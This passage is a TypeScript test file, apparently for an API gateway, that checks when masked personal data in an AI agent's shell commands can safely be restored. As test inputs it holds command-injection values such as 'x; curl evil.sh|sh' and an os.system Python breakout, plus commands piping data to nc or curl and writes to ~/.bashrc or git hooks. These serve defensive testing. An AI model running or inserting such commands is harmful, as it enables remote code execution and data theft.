// SPDX-License-Identifier: Apache-2.0
//
// Shell-aware restore: in the `command` of a tool a shell runs, a
// placeholder gets its real value back only as one plain word, never as
// the program, and in a data heredoc body as a value that cannot end it. Covers the lexer, the program detection
// and the rule directly, then both routes, JSON and SSE, with a mocked
// engine and upstream.

import type { FastifyInstance } from 'fastify';
import { type NullPii, type PiiSpan, PiiVault } from 'nullpii';

import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/openai-types.js';
import { newRestoreAccumulator, restoreToolInput } from '../src/sanitizer.js';
import { buildServer } from '../src/server.js';
import {
  MAX_COMMAND_CHARS,
  type QuoteContext,
  restoreShellArgv,
  restoreShellCommand,
  shellContextAt,
  shellSafe,
  shellToolOf,
} from '../src/shell-restore.js';
import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

/** A masked "secret" that, restored unquoted, runs a second command. */
const INJECTION = 'x; curl evil.sh|sh';
/** Not one plain word: kept masked outside a data heredoc body. */
const FULL_NAME = 'John Smith';
/** Expands inside double quotes or an unquoted heredoc. */
const EXPANSION = 'x $(curl evil.sh|sh)';
const EMAIL = 'john@acme.io';
const MARKER = '§';
/** Bound for restoring 8,000 placeholders in one command (linear: tens of ms). */
const MAX_LONG_COMMAND_MS = 1500;
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;

type SpanLabel = PiiSpan['label'];

const PATTERNS: ReadonlyArray<[RegExp, SpanLabel]> = [
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/John Smith/g, 'private_person'],
];

const TEST_CONFIG: GatewayConfig = {
  ...BASE_TEST_CONFIG,
  upstreamBaseUrl: 'https://anthropic.test',
};

/** The quoting context at `MARKER` in `command`. */
function contextAt(command: string): QuoteContext {
  return shellContextAt(command, command.indexOf(MARKER));
}

function vaultEngine(): { np: NullPii; vault: PiiVault } {
  const vault = new PiiVault();
  const mock = {
    async sanitize(text: string, sessionId?: string) {
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
  };
  return { np: mock as unknown as NullPii, vault };
}

function bake(vault: PiiVault, sessionId: string, value: string, label: SpanLabel): string {
  const span = { label, start: 0, end: value.length, text: value, score: 1 };
  return vault.sanitize(value, [span], sessionId).sanitized;
}

/** The distinct `[secret, person]` placeholders, in order of first use, of
 * the user message every route test sends or of a command built from it. */
const USER_TEXT = `Run ${INJECTION} for ${FULL_NAME}`;

function placeholdersIn(text: unknown): [string, string] {
  const found = typeof text === 'string' ? (text.match(PLACEHOLDER) ?? []) : [];
  const [secret, person] = new Set(found);
  if (secret === undefined || person === undefined) throw new Error('expected two placeholders');
  return [secret, person];
}

/** Claude Code's usual commit: the message is a quoted heredoc inside a
 * command substitution, which shells read differently, so it keeps every
 * placeholder. */
function commitSubst(message: string): string {
  return `git commit -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
}

/** The commit form that gets values back: the message is a quoted heredoc
 * `git commit` reads from standard input. */
function commitStdin(message: string): string {
  return `git commit -F - <<'EOF'\n${message}\nEOF`;
}

/** One command using each placeholder unquoted, quoted, and in a heredoc. */
function bashCommand(secret: string, person: string): string {
  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitStdin(`Thanks ${person}`)}`;
}

/** What the client must receive: real values only where they are safe.
 * Neither value is one plain word, so both stay masked, quoted or not;
 * the commit message, a data heredoc body, gets the name back. */
function expectedCommand(secret: string, person: string): string {
  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitStdin(`Thanks ${FULL_NAME}`)}`;
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

async function serve(
  respond: (body: string) => Response,
  extra: { logStream?: { write(line: string): void }; logLevel?: GatewayConfig['logLevel'] } = {},
) {
  const { np } = vaultEngine();
  const fetchImpl = async (_url: string, init: RequestInit) => respond(init.body as string);
  const config = {
    ...TEST_CONFIG,
    ...(extra.logLevel !== undefined && { logLevel: extra.logLevel }),
  };
  const app = await buildServer({
    config,
    np,
    fetchImpl,
    ...(extra.logStream !== undefined && { logStream: extra.logStream }),
  });
  apps.push(app);
  return app;
}

function sseResponse(frames: string[]): Response {
  return new Response(frames.join(''), { headers: { 'content-type': 'text/event-stream' } });
}

function anthropicFrame(event: string, data: unknown): string {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function openAiFrame(choices: unknown[]): string {
  return `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', choices })}\n\n`;
}

/** Concatenate a stream's tool-input shards per block (Anthropic) or per
 * tool-call index (OpenAI), as the SDKs do. */
function streamedInputs(body: string): Map<number, string> {
  const out = new Map<number, string>();
  const add = (index: number, shard: unknown): void => {
    if (typeof shard === 'string') out.set(index, (out.get(index) ?? '') + shard);
  };
  for (const frame of body.split('\n\n')) {
    const line = frame.split('\n').find((l) => l.startsWith('data: '));
    if (line === undefined || line === 'data: [DONE]') continue;
    const data = JSON.parse(line.slice('data: '.length)) as {
      index?: number;
      delta?: { partial_json?: string };
      choices?: Array<{
        delta?: { tool_calls?: Array<{ index: number; function?: { arguments?: string } }> };
      }>;
    };
    if (typeof data.index === 'number') add(data.index, data.delta?.partial_json);
    for (const call of data.choices?.[0]?.delta?.tool_calls ?? []) {
      add(call.index, call.function?.arguments);
    }
  }
  return out;
}

describe('shell restore · quoting context', () => {
  it.each<[string, QuoteContext]>([
    [`echo ${MARKER}`, 'none'],
    [`echo '${MARKER}'`, 'single'],
    [`echo "${MARKER}"`, 'double'],
    [`echo \\'${MARKER}`, 'none'],
    [`echo "it's ${MARKER}"`, 'double'],
    [`echo 'a "b' ${MARKER}`, 'none'],
    // Outside the grammar read (an escape, an expansion, a substitution,
    // a comment): the command is not read, so every placeholder stays
    // masked and no context applies.
    [`echo "a \\" ${MARKER}"`, 'none'],
    [`echo 'a \\' ${MARKER}`, 'none'],
    // A command substitution is unquoted, even inside double quotes.
    [`echo "$(cat ${MARKER})"`, 'none'],
    [`echo "\`cat ${MARKER}\`"`, 'none'],
    [`echo "$(printf "${MARKER}")"`, 'none'],
    [`echo "$(echo (a)) ${MARKER}"`, 'none'],
    [`echo "$((1 + 2)) ${MARKER}"`, 'none'],
    // Heredoc bodies fed to cat or tee: literal, or expanding when bare.
    [`cat <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<"EOF"\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<\\EOF\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<-'EOF'\n\t${MARKER}\n\tEOF`, 'heredoc'],
    [`cat <<'EOF' > notes.md\n${MARKER}\nEOF`, 'heredoc'],
    // `.txt` is read as input by pip, CMake and pytest: no document.
    [`cat <<'EOF' > notes.txt\n${MARKER}\nEOF`, 'none'],
    // `tee` writes where an argument points: not a data command.
    [`tee notes.txt <<'EOF'\n${MARKER}\nEOF`, 'none'],
    [commitSubst(`Thanks ${MARKER}`), 'none'],
    [commitStdin(`Thanks ${MARKER}`), 'heredoc'],
    [`cat <<EOF\n${MARKER}\nEOF`, 'heredoc-expanding'],
    [`cat <<EOF\n$(echo ${MARKER})\nEOF`, 'none'],
    // A body is not shell code: its apostrophe opens no quote.
    [`cat <<'EOF'\nit's done\nEOF\necho ${MARKER}`, 'none'],
    // Not heredocs: `<<` inside quotes, or the here-string `<<<`.
    [`echo '<<EOF'\n${MARKER}`, 'none'],
    [`cat <<<"x"\n${MARKER}`, 'none'],
    // A body another program may run, one piped on, one never closed.
    [`python3 - <<'EOF'\nprint('${MARKER}')\nEOF`, 'none'],
    [`cat <<'EOF' | grep x\n${MARKER}\nEOF`, 'none'],
    [`cat <<'EOF'\n${MARKER}`, 'none'],
    // Code handed to another interpreter: the strictest rule.
    [`bash -lc "echo ${MARKER}"`, 'none'],
    [`sh -c '${MARKER}'`, 'none'],
    [`eval "echo ${MARKER}"`, 'none'],
    [`ssh host "echo ${MARKER}"`, 'none'],
    [`su -c 'echo ${MARKER}'`, 'none'],
    [`python3 -c 'print("${MARKER}")'`, 'none'],
    [`node -e 'console.log("${MARKER}")'`, 'none'],
    [`echo '${MARKER}' | bash`, 'none'],
    [`awk '{print "${MARKER}"}' data.txt`, 'none'],
    // A `#` comment: a quote in it opens nothing.
    [`# load the user's key\nexport KEY=${MARKER}`, 'none'],
    [`# don't print\necho "t=${MARKER}"`, 'none'],
    [`echo hi # it's done\necho '${MARKER}'`, 'none'],
    [`echo hi; # it's done\necho '${MARKER}'`, 'none'],
    // Not comments: mid-word, `$#`, `${#x}`, inside quotes.
    [`echo a#b '${MARKER}'`, 'single'],
    [`echo $# '${MARKER}'`, 'none'],
    [`echo \${#x} '${MARKER}'`, 'none'],
    [`echo "#" '${MARKER}'`, 'single'],
    // The code flag after other options and their arguments.
    [`bash -o pipefail -c "echo ${MARKER}"`, 'none'],
    [`bash -euo pipefail -c "echo ${MARKER}"`, 'none'],
    [`bash --norc -c "echo ${MARKER}"`, 'none'],
    [`bash -ce "echo ${MARKER}"`, 'none'],
    [`node --eval "console.log('${MARKER}')"`, 'none'],
    [`perl -E "say '${MARKER}'"`, 'none'],
    [`su root -c "echo ${MARKER}"`, 'none'],
    // A heredoc written to a script that the same command runs is code.
    [`cat > run.sh <<'EOF'\necho ${MARKER}\nEOF\nbash run.sh`, 'none'],
    [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\nchmod +x run.sh && ./run.sh`, 'none'],
    [`cat > ./notes.md <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
  ])('%j → %s', (command, context) => {
    expect(contextAt(command)).toBe(context);
  });

  it.each<[string, QuoteContext, boolean]>([
    ['john@acme.io', 'none', true],
    [FULL_NAME, 'none', false],
    [INJECTION, 'none', false],
    // Never inert: quoted, it would still break out of a program that
    // reads the string again (`python3 <<< "…"`, `watch "…"`).
    [INJECTION, 'single', false],
    [INJECTION, 'double', false],
    // Outside a data body only one plain word, whatever the quoting.
    [FULL_NAME, 'single', false],
    ['Nicolò', 'double', true],
    ['Nicolò Rossi', 'double', false],
    ["O'Brien", 'single', false],
    ["O'Brien", 'double', false],
    ['a (b)', 'double', false],
    ['a{b}', 'single', false],
    ['tab\there', 'single', false],
    ['line\u2028break', 'double', false],
    // A word a shell would read as an option, a comment or a home dir.
    ['x --delete', 'double', false],
    ['x #rest', 'single', false],
    ['x ~/y', 'single', false],
    ['Via Roma 1 - Milano', 'double', false],
    ['two\nlines', 'single', false],
    [FULL_NAME, 'double', false],
    ['$HOME', 'double', false],
    ['a"b', 'double', false],
    ['a`id`', 'double', false],
    ['a\\b', 'double', false],
    ['hi!', 'double', false],
    [FULL_NAME, 'heredoc', true],
    [EXPANSION, 'heredoc', true],
    ["O'Brien", 'heredoc', true],
    ['two\nlines', 'heredoc', false],
    ['O\'Brien "Bob"', 'heredoc-expanding', true],
    ['$HOME', 'heredoc-expanding', false],
    ['a`id`', 'heredoc-expanding', false],
    ['a\\b', 'heredoc-expanding', false],
    // A leading dash would read as an option to the command.
    ['-rf', 'none', false],
    ['--output=/tmp/x', 'single', false],
    ['-v', 'double', false],
    ['-- a list item', 'heredoc', true],
    // zsh expands a leading `=` to a program path.
    ['=ls', 'none', false],
    ['a=b', 'none', true],
    ['~root', 'none', false],
    ['mario.rossi@example.com', 'single', true],
  ])('shellSafe(%j, %s) is %s', (value, context, safe) => {
    expect(shellSafe(value, context)).toBe(safe);
  });
});

describe('shell restore · restoreShellCommand', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('keeps a value that is not one plain word masked, quoted or not; restores a plain one', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(
      np,
      `echo ${secret} && echo '${secret}' && echo "${person}" '${person}' ${email}`,
      sessionId,
    );

    expect(r.command).toBe(
      `echo ${secret} && echo '${secret}' && echo "${person}" '${person}' ${EMAIL}`,
    );
    expect(r.keptMasked).toEqual([secret, secret, person, person]);
    expect(r.results.reduce((n, x) => n + x.replacements, 0)).toBe(1);
  });

  it.each([
    ['program', (p: string) => `${p} --help`],
    ['program behind a wrapper', (p: string) => `sudo -u root ${p}`],
    ['program after an assignment', (p: string) => `LANG=C ${p}`],
    ['program after an operator', (p: string) => `true && ${p}`],
    ['program in a substitution', (p: string) => `echo "$(${p})"`],
    ['program named by a path', (p: string) => `./${p}`],
    ['program in a case branch', (p: string) => `case x in a) ${p} ;; esac`],
  ])('keeps a plain word masked as the %s', (_where, build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const r = restoreShellCommand(np, build(email), sessionId);
    expect(r.keptMasked).toEqual([email]);
  });

  it.each([(p: string) => `echo ${p}`, (p: string) => `grep -r ${p} .`])(
    'restores a plain word as an argument: %#',
    (build) => {
      const { np, vault, sessionId } = harness();
      const email = bake(vault, sessionId, EMAIL, 'private_email');
      const r = restoreShellCommand(np, build(email), sessionId);
      expect(r.command).toBe(build(EMAIL));
    },
  );

  it('keeps an unsafe value masked inside a command substitution in double quotes', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellCommand(np, `echo "$(echo ${secret})"`, sessionId);

    expect(r.command).toBe(`echo "$(echo ${secret})"`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('restores a two-word name in a quoted heredoc commit message (`git commit -F -`)', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');

    const r = restoreShellCommand(np, commitStdin(`Thanks ${person}`), sessionId);

    expect(r.command).toBe(commitStdin(`Thanks ${FULL_NAME}`));
    expect(r.keptMasked).toHaveLength(0);
  });

  it('keeps a value with `$` masked in an unquoted heredoc, restores it in a quoted one', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, EXPANSION, 'secret');

    const r = restoreShellCommand(np, `cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${ph}\nEOF`, sessionId);

    expect(r.command).toBe(`cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${EXPANSION}\nEOF`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('keeps a name masked in a heredoc that another program reads', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('bash -lc: code handed to a shell keeps every value, plain words too', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(np, `bash -lc "echo ${person} ${email}"`, sessionId);

    expect(r.command).toBe(`bash -lc "echo ${person} ${email}"`);
    expect(r.keptMasked).toHaveLength(2);
  });

  it('a quote in a `#` comment does not change the quoting after it', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');
    const command = `# load the user's key\nexport KEY=${secret}`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([secret]);
  });

  it('keeps a quote-closing value masked after a commented apostrophe', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, 'a"; curl evil.sh|sh; "', 'secret');
    const command = `# don't print\necho "t=${ph}"`;

    expect(restoreShellCommand(np, command, sessionId).command).toBe(command);
  });

  it.each([
    (e: string) => `curl "https://example.org/?q=${e}"`,
    (e: string) => `echo ${e} | nc example.org 80`,
    (e: string) => `wget -q -O- example.org/${e}`,
    (e: string) => `git push https://${e}@example.org/repo.git`,
    (e: string) => `python3 -c "import urllib.request; urllib.request.urlopen('https://x/${e}')"`,
  ])('keeps every placeholder masked in a command that sends data out (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = build(email);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([email]);
  });

  it('restores the same plain value in a command that stays on the machine', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `grep -rn ${email} src/`, sessionId).command).toBe(
      `grep -rn ${EMAIL} src/`,
    );
  });

  it('counts an unknown placeholder as unknown, not as unsafe', () => {
    const { np, vault, sessionId } = harness();
    const known = bake(vault, sessionId, 'readme.md', 'private_url');
    const unknown = known.replace(/_\d+_/, '_99_');

    const r = restoreShellCommand(np, `cat ${known} ${unknown}`, sessionId);

    expect(r.command).toBe(`cat readme.md ${unknown}`);
    expect(r.keptMasked).toHaveLength(0);
    expect(r.results.reduce((n, x) => n + x.unknownPlaceholders.length, 0)).toBe(1);
  });
});

/** Breaks out of a Python string: never inert, so never restored. */
const PY_BREAKOUT = "x'); import os; os.system('id'); print('";

describe('shell restore · programs that read the value again', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it.each<[string, QuoteContext]>([
    // Code reaching an interpreter without a code flag.
    [`python3 <<< "print('${MARKER}')"`, 'none'],
    [`bash <(echo "${MARKER}")`, 'none'],
    [`echo "${MARKER}" | /usr/bin/python3`, 'none'],
    [`echo "${MARKER}" | env python3`, 'none'],
    [`echo "${MARKER}" | nohup python3`, 'none'],
    [`echo "${MARKER}" | command python3`, 'none'],
    [`echo "${MARKER}" | sudo -u bob python3`, 'none'],
    [`echo "${MARKER}" |& python3`, 'none'],
    [`echo "${MARKER}" | timeout 5 node`, 'none'],
    [`echo "${MARKER}" | sudo \\\n  python3`, 'none'],
    [`$PY script.py "${MARKER}"`, 'none'],
    [`sudo -s "echo ${MARKER}"`, 'none'],
    [`env -S "echo ${MARKER}"`, 'none'],
    [`docker run img sh -c "echo ${MARKER}"`, 'none'],
    // Wrappers that run their argument through a shell.
    [`watch "echo ${MARKER}"`, 'none'],
    [`flock /tmp/lock -c "echo ${MARKER}"`, 'none'],
    [`script -qc "echo ${MARKER}" /dev/null`, 'none'],
    [`xargs -I{} echo "${MARKER}" {}`, 'none'],
    // A file written and run by the same command.
    [`echo "${MARKER}" > run.sh; bash run.sh`, 'none'],
    [`cat > Makefile <<'EOF'\n${MARKER}\nEOF\nmake -f Makefile`, 'none'],
    [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\n./run.sh`, 'none'],
    // A data body in a command that also runs something else: the
    // double-quote rule, not the body's own.
    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit add notes.md`, 'heredoc'],
    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit push`, 'double'],
    // A file written after a `cd` lands where the `cd` points: no plain file.
    [`cd docs && cat > notes.md <<'EOF'\n${MARKER}\nEOF`, 'none'],
    // `$'…'` honours backslash escapes; a redirection is not a separator.
    [`echo $'it\\'s' '${MARKER}'`, 'none'],
    [`echo $'a\\'' ${MARKER}`, 'none'],
    [`cat <<'EOF' > notes.md 2>&1\n${MARKER}\nEOF`, 'heredoc'],
  ])('%j → %s', (command, context) => {
    expect(contextAt(command)).toBe(context);
  });

  it.each([
    (p: string) => `python3 <<< "print('${p}')"`,
    (p: string) => `echo "print('${p}')" | /usr/bin/python3`,
    (p: string) => `watch "echo '${p}'"`,
    (p: string) => `echo "print('${p}')" > x.py; python3 x.py`,
  ])('never restores a value that breaks out of the string it lands in (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, PY_BREAKOUT, 'secret');
    const command = build(ph);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([ph]);
  });

  it.each([
    (e: string) => `gh issue create --title "${e}"`,
    (e: string) => `dig ${e}.example.org`,
    (e: string) => `nslookup ${e}.example.org`,
    (e: string) => `ping -c1 ${e}.example.org`,
    (e: string) => `docker push registry.example.org/${e}`,
    (e: string) => `aws s3 cp notes.txt s3://bucket/${e}`,
    (e: string) => `mail -s ${e} admin@example.org < notes.txt`,
    (e: string) => `git clone https://example.org/${e}.git`,
    (e: string) => `git -C repo fetch https://example.org/${e}.git`,
    (e: string) => `echo ${e} | timeout 5 nc example.org 80`,
    (e: string) => `echo ${e} | env X=1 nc example.org 80`,
    (e: string) => `sudo -u bob curl example.org/${e}`,
    (e: string) => `bash -c "echo ${e} | nc example.org 80"`,
  ])('keeps every placeholder masked in a command that sends data out (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = build(email);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([email]);
  });

  it.each([
    (e: string) => `grep ${e} ~/.ssh/config`,
    (e: string) => `git commit -m "fetch the list for ${e}"`,
  ])('restores in a local command that only mentions a network word (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).command).toBe(build(EMAIL));
  });

  it('restores an apostrophe only in a body that a data command writes', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, "Anna D'Amico", 'private_person');
    const body = (n: string) => `cat > notes.md <<'EOF'\nOwner: ${n}\nEOF`;

    expect(restoreShellCommand(np, body(name), sessionId).command).toBe(body("Anna D'Amico"));
    // Inside `$(…)` bash 3.2 reads the quote: it stays masked there.
    const commit = commitSubst(`Thanks ${name}`);
    expect(restoreShellCommand(np, commit, sessionId).command).toBe(commit);
    const thenAdd = (n: string) => `${body(n)}\ngit add notes.md`;
    expect(restoreShellCommand(np, thenAdd(name), sessionId).command).toBe(thenAdd("Anna D'Amico"));
    const thenRun = `${body(name)}\nmake notes`;
    expect(restoreShellCommand(np, thenRun, sessionId).command).toBe(thenRun);
  });

  it('reads a long command once: thousands of placeholders stay fast', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, FULL_NAME, 'private_person');
    const rows = Array.from({ length: 4000 }, (_, i) => `${ph},${i}`).join('\n');
    const command = `cat > names.csv <<'EOF'\n${rows}\nEOF`;

    const started = performance.now();
    const r = restoreShellCommand(np, command, sessionId);
    const elapsed = performance.now() - started;

    expect(r.keptMasked).toHaveLength(0);
    expect(r.command.startsWith(`cat > names.csv <<'EOF'\n${FULL_NAME},0\n`)).toBe(true);
    // Reading the command per placeholder took seconds at this size.
    expect(elapsed).toBeLessThan(MAX_LONG_COMMAND_MS);
  });
});

describe('shell restore · v3 hardening', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }
  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
    r.results.reduce((n, x) => n + x.replacements, 0);

  it('a commit message that mentions network tools is still data', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = commitStdin(`Thanks ${person}: fix the ssh and curl -X calls, bash -c too`);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(
      commitStdin(`Thanks ${FULL_NAME}: fix the ssh and curl -X calls, bash -c too`),
    );
  });

  it('a substitution in an expanding body is still read for network clients', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `cat > a.txt <<EOF\n$(curl -s example.org) ${email}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `open "https://example.org/?q=${p}"`,
    (p: string) => `python3 -m webbrowser https://example.org/${p}`,
    (p: string) => `grep ${p} https://example.org`,
  ])('a URL handed to a program that is not a data one keeps every value: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(email), sessionId))).toBe(0);
  });

  it('a URL in an echo or a commit message does not stop the restore', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(np, `echo "see https://example.org" ${email}`, sessionId);

    expect(r.command).toBe(`echo "see https://example.org" ${EMAIL}`);
  });

  it.each([
    (p: string) => `sed -i 's/old/${p}/' config.yml`,
    (p: string) => `find . -name '*.yml' -exec gsed -i 's,a,${p},' {} +`,
    (p: string) => `perl -pi -e 's{a}{${p}}' x.txt`,
    (p: string) => `bash -c "sed s/a/${p}/ x"`,
  ])('sed or perl in the command keeps every value, plain words too: %#', (build) => {
    const { np, vault, sessionId } = harness();
    // `x/e` closes a sed replacement and adds the flag that runs it.
    const word = bake(vault, sessionId, 'x/e', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `echo hi > ${p}`,
    (p: string) => `cat notes.txt >> ${p}`,
    (p: string) => `sudo -u root echo ${p}`,
    (p: string) => `ssh-keygen -t ed25519 -C ${p}`,
    (p: string) => `rm -rf ${p}`,
    (p: string) => `cp a.txt ${p}`,
    (p: string) => `some-unknown-tool ${p}`,
  ])('restores nothing outside the allowlist or into a redirection target: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
  });

  it.each([
    (p: string) => `fd . -x ${p}`,
    (p: string) => `rg --hostname-bin=${p} x`,
    (p: string) => `git grep -O${p} foo`,
    (p: string) => `find . -name ${p} -delete`,
    (p: string) => `find . -fprint ${p}`,
    (p: string) => `sort a.txt -o ${p}`,
    (p: string) => `git diff --output=${p}`,
    (p: string) => `uniq a.txt ${p}`,
    (p: string) => `printf -v ${p} '%s' x`,
    (p: string) => `printf -v PATH '%s' ${p}`,
    (p: string) => `file -C -m ${p}`,
    (p: string) => `tee notes.md <<'EOF'\n${p}\nEOF`,
    (p: string) => `echo "$(${':;'.repeat(70)})" B=${p}`,
  ])('restores nothing where a listed program would run or write by an option: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
  });

  it.each([
    (p: string) => `grep ${p} /etc/hosts 2>/dev/null`,
    (p: string) => `cat /etc/hosts | grep ${p}`,
    (p: string) => `git log --grep user=${p}`,
  ])('restores into read-only commands the earlier heuristics refused: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).command).toBe(build(EMAIL));
  });

  it.each([
    (p: string) => `>| cat python3 ${p}`,
    (p: string) => `>& cat python3 ${p}`,
    (p: string) => `>! cat python3 ${p}`,
    (p: string) => `echo hi >& ${p}`,
    (p: string) => `cat x {fd}>${p}`,
    (p: string) => `find ${p} $'-name' x`,
    (p: string) => `sort --out=${p} a.txt`,
    (p: string) => `git grep --open=x ${p}`,
    (p: string) => `cd ${p} && git status`,
    (p: string) => `cat >> .git/config <<'EOF'\n${p}\nEOF`,
    (p: string) => `cat > Makefile <<'EOF'\n${p}\nEOF`,
  ])(
    'round 7: a prefix, a computed or abbreviated option, a repository or a non-document target keeps the value: %s',
    (build) => {
      const { np, vault, sessionId } = harness();
      const email = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
    },
  );

  it.each([
    (p: string) => `sort --o ${p} a.txt`,
    (p: string) => `sort --co=${p} a.txt`,
    (p: string) => `base64 --o ${p} a.txt`,
    (p: string) => `file --co -m ${p}`,
    (p: string) => `git grep --op=${p} foo`,
    (p: string) => `echo ${p} &>> ~/.bashrc`,
    (p: string) => `echo ${p} &> .git/hooks/pre-commit`,
    (p: string) => `echo ${p} >&.git/hooks/pre-commit`,
    (p: string) => `echo ${p} 1<>~/.bashrc`,
    (p: string) => `cat <<'EOF' >&Makefile\n${p}\nEOF`,
    (p: string) => `cat <<'EOF' 1<>run.sh\n${p}\nEOF`,
    (p: string) => `{ cat <<'EOF'; } >&Makefile\n${p}\nEOF`,
  ])('round 8: one-letter abbreviations and every output redirection: %s', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
  });

  it.each([
    (p: string) => `${'A=1 '.repeat(70)}${p} x`,
    (p: string) => `${'2>/dev/null '.repeat(70)}${p} x`,
    (p: string) => `ls ${'a '.repeat(70)}${p}`,
    (p: string) => `find ${p} ${'a '.repeat(70)}-delete`,
    (p: string) => `ls a${' '.repeat(4100)}> ${p}`,
    (p: string) => `cd x${' '.repeat(4100)}${p} && git log`,
    (p: string) => `cat <<EOF > Makefile\n\${HOME}\n${p}\nEOF`,
    (p: string) => `echo ${p} > run.sh`,
    (p: string) => `echo ${p} &> out`,
